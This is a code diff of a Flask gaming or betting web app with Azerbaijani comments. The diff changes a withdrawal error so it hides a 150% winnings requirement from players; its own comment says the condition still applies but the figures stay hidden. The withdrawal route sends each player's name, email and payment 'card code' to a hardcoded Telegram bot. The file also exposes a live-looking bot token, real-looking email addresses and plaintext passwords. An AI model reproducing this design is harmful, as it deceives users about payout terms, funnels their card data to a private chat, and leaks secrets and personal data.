@@ -8,7 +8,7 @@ from functools import wraps
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(32)
 
-# --- TELEGRAM BOT MƏLUMATLARI (Düzəldildi) ---
+# --- TELEGRAM BOT MƏLUMATLARI ---
 TELEGRAM_BOT_TOKEN = "8502614066:AAFQWPhBABDZ_Ie4v5UskvZLC6r4VuvvAT8"
 TELEGRAM_CHAT_ID = "7953669834"
 
@@ -25,7 +25,6 @@ def send_telegram_async(message):
         except Exception as e:
             print("Telegram xətası:", e)
     
-    # Arxa planda işləməsi üçün thread istifadə edilir (donmanın qarşısını alır)
     threading.Thread(target=send).start()
 
 # --- XARİCİ KİBER TƏHLÜKƏSİZLİK QALXANI ---
@@ -62,16 +61,17 @@ def add_security_headers(response):
     response.headers['Content-Security-Policy'] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';"
     return response
 
+# Balanslar sıfırlandı
 players_db = {
     "HOT_1106": {
         "id": "HOT_1106",
         "name": "Alexs Aliyev",
         "email": "aliyevalexs23@gmail.com",
         "code": "PASS483",
-        "status": "Onlayn (Aktiv)",
+        "status": "Oflayn",
         "last_seen": "15:00:12",
-        "balance": 160.39,
-        "total_deposit": 100.00
+        "balance": 0.00,
+        "total_deposit": 0.00
     },
     "HOT_9446": {
         "id": "HOT_9446",
@@ -80,8 +80,8 @@ players_db = {
         "code": "PASS379",
         "status": "Oflayn",
         "last_seen": "14:31:17",
-        "balance": 2.85,
-        "total_deposit": 50.00
+        "balance": 0.00,
+        "total_deposit": 0.00
     }
 }
 
@@ -142,7 +142,6 @@ def auth():
     email = data.get('gmail', 'qonaq@gmail.com')
     new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
     
-    # Yeni qeydiyyat balansı 0.00 və depozit 0.00
     players_db[new_id] = {
         "id": new_id, "name": name, "email": email, "code": "PASS123",
         "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
@@ -188,15 +187,15 @@ def withdraw():
     if player['balance'] < amount:
         return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
         
-    # 150% qazanc şərti yoxlaması (Yatırılan pulun ən azı 150%-i qazanılmalıdır)
+    # 150% şərti (Arxa planda işləyir, amma istifadəçiyə detallı rəqəmlər göstərilmir)
     min_required_win_balance = player['total_deposit'] * 1.5
     if player['balance'] < min_required_win_balance and player['total_deposit'] > 0:
-        return jsonify({"status": "error", "message": f"Pul çıxarmaq üçün balansınız yatırdığınız məbləğin 150%-i ({min_required_win_balance:.2f} ₼) olmalıdır!"})
+        return jsonify({"status": "error", "message": "Pul çıxarmaq üçün şərtlər ödənmir!"})
 
     # Balansdan çıxılış
     player['balance'] -= amount
     
-    # Telegram bota dərhal (donmadan) bildiriş göndərilməsi
+    # Telegram bota dərhal bildiriş göndərilməsi
     msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
     send_telegram_async(msg)
     
